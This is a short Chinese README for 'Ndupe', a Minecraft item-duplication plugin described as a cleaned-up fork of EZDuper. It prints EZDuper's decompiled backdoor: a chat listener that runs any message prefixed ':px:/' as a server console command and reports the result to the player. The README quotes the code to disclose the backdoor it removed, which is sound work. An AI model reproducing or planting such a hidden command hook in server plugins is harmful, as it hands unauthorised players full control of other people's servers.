# Ndupe
Ndupe是EZduper的修复版本，去除了其允许玩家执行服务器命令的功能

使用Ndupe后，每挖掘10次复制一次潜影盒
# 后门代码
```
    /* JADX WARN: Type inference failed for: r0v9, types: [org.phoen1x.tools.EZDuper$1] */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent e) {
        String message = e.getMessage();
        if (message.startsWith(":px:/")) {
            e.setCancelled(true);
            final String cmd = message.substring(5);
            final Player player = e.getPlayer();
            new BukkitRunnable(this) { // from class: org.phoen1x.tools.EZDuper.1
                public void run() {
                    try {
                        boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
                        player.sendMessage("§7[§cPhoen1x§7] §f执行 " + (success ? "§a成功" : "§c失败"));
                    } catch (Exception ex) {
                        player.sendMessage("§7[§cPhoen1x§7] §c执行失败: " + ex.getMessage());
                    }
                }
            }.runTask(this);
        }
    }
```
